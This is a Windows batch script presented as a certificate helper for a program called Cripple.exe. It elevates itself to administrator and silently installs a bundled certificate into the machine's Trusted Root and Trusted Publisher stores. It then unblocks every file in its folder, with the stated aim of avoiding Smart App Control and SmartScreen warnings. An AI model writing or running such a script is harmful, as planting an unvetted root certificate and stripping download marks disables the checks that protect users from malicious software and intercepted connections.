@echo off
setlocal EnableDelayedExpansion

:: Check for Administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ========================================================
    echo  Requesting Administrator Privileges...
    echo ========================================================
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

title Cripple NetStrip - Security Certificate & Smart App Control Helper
color 0A

echo ========================================================
echo  FrenzyPenguin Media - Trusted Certificate Installer
echo ========================================================
echo.
echo This helper installs the FrenzyPenguin Media digital certificate
echo into your system's Trusted Root and Trusted Publisher stores
echo to eliminate Smart App Control and Windows SmartScreen alerts.
echo.
echo [1/3] Importing Certificate to Trusted Publishers...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Certificate -FilePath '%~dp0FrenzyPenguinMedia.cer' -CertStoreLocation Cert:\LocalMachine\TrustedPublisher -ErrorAction SilentlyContinue | Out-Null; Import-Certificate -FilePath '%~dp0FrenzyPenguinMedia.cer' -CertStoreLocation Cert:\CurrentUser\TrustedPublisher -ErrorAction SilentlyContinue | Out-Null"

echo [2/3] Importing Certificate to Trusted Root Authorities...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Certificate -FilePath '%~dp0FrenzyPenguinMedia.cer' -CertStoreLocation Cert:\LocalMachine\Root -ErrorAction SilentlyContinue | Out-Null"

echo [3/3] Removing Web Download Lock (Zone.Identifier MOTW)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%~dp0' -Recurse -File | Unblock-File -ErrorAction SilentlyContinue"

echo.
echo ========================================================
echo  [SUCCESS] Certificate installed and files unblocked!
echo  You can now launch Cripple.exe cleanly without warnings.
echo ========================================================
echo.
pause
